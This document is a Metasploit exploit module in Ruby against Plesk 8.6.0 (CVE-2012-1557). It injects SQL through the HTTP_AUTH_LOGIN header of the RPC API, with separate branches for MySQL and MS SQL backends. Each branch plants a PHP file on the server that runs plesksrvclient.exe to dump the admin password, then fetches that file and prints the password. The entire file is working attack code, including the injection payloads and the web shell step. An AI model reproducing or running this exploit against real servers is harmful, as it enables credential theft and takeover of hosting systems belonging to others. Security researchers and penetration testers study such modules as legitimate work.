require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
    include Msf::Exploit::Remote::HttpClient

    def initialize(info = {})
      super(update_info(info,
      'Name'           => 'Plesk 8.6.0 Remote Password Extraction Exploit',
      'Description'    => %q{
          This module exploits a SQLi vulnerability in Plesk version 8.6.0 RPC API to extract the plesk admin password
      },
      'Author'         =>
              [
                'Gaurav Baruah <gaurav[at]esecforte.com>',
                'Sachin Kumar <sachin[at]esecforte.com>',
                'Vivek Razdan <vivek[at]esecforte.com>'
                #'eSecForte Technologies Pvt. Ltd. <sploitlab[at]esecforte.com>',
              ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2012-1557'],
          ['URL', 'http://www.esecforte.com/blog/exploring-plesks-unspecified-vulnerability/'],
          ['URL', 'http://krebsonsecurity.com/2012/07/plesk-0day-for-sale-as-thousands-of-sites-hacked/']
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'ConnectionType' => 'find',
            },
        },
      'DefaultOptions'  =>
        {
          'DisablePayloadHandler' => 'true',
        },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Automatic Plesk 8.6.0', { }]],
      'DisclosureDate' => 'Mar 12 2012',
      'DefaultTarget'  => 0))

      register_options(
      [
      Opt::RPORT(8880),
      OptBool.new('DisablePayloadHandler', [true, 'Disable Payload Handler', true]),
      ])
    end

    def get_mssql_plesk_dir
      data = <<-EOF
<?xml version="1.0" encoding="UTF-8"?><packet version="1.5.1.0">
<dns><add_rec><domain_id>1</domain_id><type>A</type><host>mail</host>
<value>127.0.0.1</value></add_rec></dns></packet>
EOF
      passwd = rand_text_alpha(6)
      res = send_request_raw({
        'uri'	  => "/enterprise/control/agent.php",
        'method'  => 'POST',
        'data'    => data,
        'headers' =>
        {
          'HTTP_AUTH_LOGIN'	 => "';exec a..a;--",
          'HTTP_AUTH_PASSWD'	 => passwd,
          'Content-Type'       => 'text/xml',
          'Content-Length'     => data.length,
        }
      }, 25)


      if (res)
        plesk_dir=res.body[/[C-Z]:.*\\Parallels\\Plesk\\admin\\/]
        return plesk_dir
      end
    end


    def check
      data = <<-EOF
<?xml version="1.0" encoding="UTF-8"?><packet version="1.5.1.0">
<dns><add_rec><domain_id>1</domain_id><type>A</type><host>mail</host>
<value>127.0.0.1</value></add_rec></dns></packet>
EOF
      passwd = rand_text_alpha(6)
      print_status("Detecting if Plesk is vulnerable...")
      res = send_request_raw({
        'uri'	  => "/enterprise/control/agent.php",
        'method'  => 'POST',
        'data'    => data,
        'headers' =>
        {
          'HTTP_AUTH_LOGIN'	 => "'",
          'HTTP_AUTH_PASSWD'	 => passwd,
          'Content-Type'       => 'text/xml',
          'Content-Length'     => data.length,
        }
      }, 25)

      if (res)
        if(res.body[/MySQL/])
          print_status("Plesk backend has been detected as MySQL")
          plesk_http_dir=res.body[/.*\\Plesk\\admin\\htdocs\\enterprise\\control/]
          plesk_db="mysql"
          if (plesk_http_dir)
            plesk_http_dir=plesk_http_dir.gsub('\\','\\\\\\')
            return plesk_http_dir,Exploit::CheckCode::Vulnerable,plesk_db
          end
        elsif (res.body[/Microsoft OLE DB/])
          plesk_db="mssql"
          print_status("Plesk backend has been detected as MS SQL Server")
          plesk_http_dir=get_mssql_plesk_dir()
          return plesk_http_dir,Exploit::CheckCode::Vulnerable,plesk_db
        elsif (res.body[/Jet/])
          print_status("Plesk backend has been detected as MS Access. This module does not supports JET database yet!")
          return Exploit::CheckCode::Safe
        else
          return "null",Exploit::CheckCode::Safe
        end
      end
      return "null",Exploit::CheckCode::Safe
    end


  def exploit

    result_array = check()
    if result_array and (result_array[1]==Exploit::CheckCode::Vulnerable and result_array[2]=="mysql")
    plesk_http_dir = result_array[0]
      php_fname	= rand_text_alphanumeric(5) + '.php'
      data = <<-EOF
<?xml version="1.0" encoding="UTF-8"?><packet version="1.5.1.0">
<dns><add_rec><domain_id>1</domain_id><type>A</type><host>mail</host>
<value>127.0.0.1</value></add_rec></dns></packet>
EOF
      passwd = rand_text_alpha(6)
      mysqli_exploit_sqli = "' union select \"<?php $a=exec(\'..\\\\..\\\\..\\\\bin\\\\plesksrvclient.exe -get -nogui\');"
      mysqli_exploit_sqli = mysqli_exploit_sqli + "echo $a;?>\" into outfile \"#{plesk_http_dir}\\\\#{php_fname}\"#"
      send_request_raw({
          'uri'	  => "/enterprise/control/agent.php",
          'method'  => 'POST',
          'data'    => data,
          'headers' =>
          {
          'HTTP_AUTH_LOGIN'	 => mysqli_exploit_sqli,
          'HTTP_AUTH_PASSWD'	 => passwd,
          'Content-Type'       => 'text/xml',
          'Content-Length'     => data.length,
          }
          }, 25)
      print_status("Sent SQLI..verifying if it succeeded")
      res = send_request_raw({
        'method' => 'GET',
        'uri'    => "/enterprise/control/#{php_fname}"
      })

      if (res and res.code==200)
        print_status("yup it did !")
        print_good(res.body)
      else
        print_error("failed to create file using SQLI")
      end
    elsif result_array and (result_array[1]==Exploit::CheckCode::Vulnerable and result_array[2]=="mssql")
      plesk_http_dir = result_array[0]
      php_fname	= rand_text_alphanumeric(5) + '.php'
      data = <<-EOF
<?xml version="1.0" encoding="UTF-8"?><packet version="1.5.1.0">
<dns><add_rec><domain_id>1</domain_id><type>A</type><host>mail</host>
<value>127.0.0.1</value></add_rec></dns></packet>
EOF
      passwd = rand_text_alpha(6)
      mssqli_exploit_sqli = "';DECLARE @li_file_sytem_object INT; DECLARE @li_result INT;DECLARE @li_file_id INT;"
      mssqli_exploit_sqli = mssqli_exploit_sqli + "EXECUTE @li_result = sp_OACreate 'Scripting.FileSystemObject', @li_file_sytem_object OUT;"
      mssqli_exploit_sqli = mssqli_exploit_sqli + "EXECUTE @li_result = sp_OAMethod @li_file_sytem_object, 'OpenTextFile', @li_file_id OUT,"
      mssqli_exploit_sqli = mssqli_exploit_sqli + "'#{plesk_http_dir}htdocs\\enterprise\\control\\#{php_fname}', 8, 1;"
      mssqli_exploit_sqli = mssqli_exploit_sqli + "EXECUTE @li_result = sp_OAMethod @li_file_id, 'WriteLine', NULL,"
      mssqli_exploit_sqli = mssqli_exploit_sqli + "'<?php $a=exec(\"..\\\\..\\\\..\\\\bin\\\\plesksrvclient.exe -get -nogui\");echo $a;?>';--"
      send_request_raw({
          'uri'	  => "/enterprise/control/agent.php",
          'method'  => 'POST',
          'data'    => data,
          'headers' =>
          {
          'HTTP_AUTH_LOGIN'	 => mssqli_exploit_sqli,
          'HTTP_AUTH_PASSWD'	 => passwd,
          'Content-Type'       => 'text/xml',
          'Content-Length'     => data.length,
          }
          }, 25)
      print_status("Sent SQLI..verifying if it succeeded")
      res = send_request_raw({
        'method' => 'GET',
        'uri'    => "/enterprise/control/#{php_fname}"
      })


      if (res and res.code==200)
        print_status("yup it did !")
        print_good(res.body) #Print Plesk Admin Password to Screen
      else
        print_error("failed to create file using SQLI")
      end
    else
    print_error(datastore['RHOST'] + " is not vulnerable")
    end

    end

end
